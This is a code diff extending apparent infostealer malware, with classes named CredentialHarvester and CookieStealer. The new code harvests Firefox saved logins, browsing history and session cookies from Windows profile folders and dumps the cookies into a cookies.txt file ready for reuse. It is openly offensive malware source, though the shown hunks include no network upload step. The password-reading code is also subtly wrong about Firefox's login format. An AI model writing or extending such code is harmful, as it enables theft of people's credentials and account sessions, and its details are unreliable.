@@ -238,8 +238,15 @@ class CredentialHarvester:
                         'iridium': self.appdata + '\\Iridium\\User Data',
                         'opera': self.roaming + '\\Opera Software\\Opera Stable',
                         'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
-                        'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
+                        'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data',
+                        'firefox': 'firefox'  # Special marker - handled separately
                     }}
+                    
+                    # Firefox profile directories (checked separately)
+                    self.firefox_profile_dirs = [
+                        os.path.join(self.roaming, 'Mozilla', 'Firefox', 'Profiles'),
+                        os.path.join(self.appdata, 'Mozilla', 'Firefox', 'Profiles')
+                    ]
 
                     self.profiles = [
                         'Default',
@@ -304,6 +311,11 @@ class CredentialHarvester:
                                 print(f"Error processing credit cards for {{name}} {{profile}}: {{e}}")
 
                     print(f"Browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")
+
+                    # Process Firefox separately (has different profile structure)
+                    self._process_firefox_browser()
+
+                    print(f"Final browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")
 
                 def get_master_key(self, path: str) -> str:
                     try:
@@ -521,6 +533,98 @@ class CredentialHarvester:
                     open(path, "x").close()
                     return path
 
+                def _process_firefox_browser(self):
+                    """Process Firefox passwords and history from profile directories"""
+                    try:
+                        print("Processing Firefox browser data...")
+                        
+                        # Find all Firefox profiles
+                        firefox_profiles = []
+                        for profile_dir in self.firefox_profile_dirs:
+                            if os.path.exists(profile_dir):
+                                for item in os.listdir(profile_dir):
+                                    profile_path = os.path.join(profile_dir, item)
+                                    if os.path.isdir(profile_path):
+                                        firefox_profiles.append(profile_path)
+                        
+                        if not firefox_profiles:
+                            print("No Firefox profiles found")
+                            return
+                        
+                        print(f"Found {{len(firefox_profiles)}} Firefox profiles")
+                        
+                        for profile_path in firefox_profiles:
+                            print(f"Processing Firefox profile: {{profile_path}}")
+                            
+                            # Process passwords (logins.json)
+                            try:
+                                logins_db = os.path.join(profile_path, 'logins.json')
+                                if os.path.exists(logins_db):
+                                    with open(logins_db, 'r', encoding='utf-8') as f:
+                                        logins_data = json.load(f)
+                                        if 'logins' in logins_data:
+                                            for entry in logins_data['logins']:
+                                                self.credentials_data.append({{
+                                                    "browser": "firefox",
+                                                    "profile": os.path.basename(profile_path),
+                                                    "url": entry.get('hostname', ''),
+                                                    "username": entry.get('username', ''),
+                                                    "password": entry.get('password', '')
+                                                }})
+                                            print(f"Found {{len(logins_data['logins'])}} passwords in Firefox profile")
+                            except Exception as e:
+                                print(f"Error processing Firefox logins: {{e}}")
+                            
+                            # Process history (places.sqlite)
+                            try:
+                                history_db = os.path.join(profile_path, 'places.sqlite')
+                                temp_db = self._copy_db_to_temp(history_db)
+                                if temp_db:
+                                    conn = sqlite3.connect(temp_db)
+                                    cursor = conn.cursor()
+                                    results = cursor.execute("SELECT url, visit_count, title, last_visit_date FROM moz_places").fetchall()
+                                    for res in results:
+                                        url, visit_count, title, last_visit_date = res
+                                        self.history_data.append({{
+                                            "browser": "firefox",
+                                            "profile": os.path.basename(profile_path),
+                                            "url": url or "",
+                                            "visit_count": visit_count or 0,
+                                            "title": title or "",
+                                            "last_visit_time": last_visit_date or 0
+                                        }})
+                                    cursor.close()
+                                    conn.close()
+                                    os.remove(temp_db)
+                                    print(f"Found {{len(results)}} history entries in Firefox profile")
+                            except Exception as e:
+                                print(f"Error processing Firefox history: {{e}}")
+                            
+                            # Process cookies (cookies.sqlite)
+                            try:
+                                cookies_db = os.path.join(profile_path, 'cookies.sqlite')
+                                temp_db = self._copy_db_to_temp(cookies_db)
+                                if temp_db:
+                                    conn = sqlite3.connect(temp_db)
+                                    cursor = conn.cursor()
+                                    
+                                    cookie_file_path = os.path.join(self.browser_output_dir, "cookies.txt")
+                                    with open(cookie_file_path, 'a', encoding="utf-8") as f:
+                                        f.write(f"\nBrowser: firefox     Profile: {{os.path.basename(profile_path)}}\n\n")
+                                        for res in cursor.execute("SELECT host, name, path, value, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies").fetchall():
+                                            host, name, path, value, expiry, is_secure, is_httponly, same_site = res
+                                            if host and name and value:
+                                                f.write(f"{{host}}\t{{'FALSE' if expiry == 0 else 'TRUE'}}\t{{path}}\t{{'FALSE' if host.startswith('.') else 'TRUE'}}\t{{expiry or 0}}\t{{name}}\t{{value}}\n")
+                                    cursor.close()
+                                    conn.close()
+                                    os.remove(temp_db)
+                            except Exception as e:
+                                print(f"Error processing Firefox cookies: {{e}}")
+                        
+                        print(f"Firefox processing complete. Total credentials: {{len(self.credentials_data)}}, Total history: {{len(self.history_data)}}")
+                    except Exception as e:
+                        print(f"Error in Firefox browser processing: {{e}}")
+
             # Create Browsers instance to extract data directly
             browsers = Browsers()
 
@@ -565,6 +669,7 @@ class CookieStealer:
 
         self.FIREFOX_PROFILE_DIRS = [
             os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
             os.path.join(os.getenv('LOCALAPPDATA'), 'Packages', 'Mozilla.Firefox_*', 'LocalCache', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
         ]
         self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')
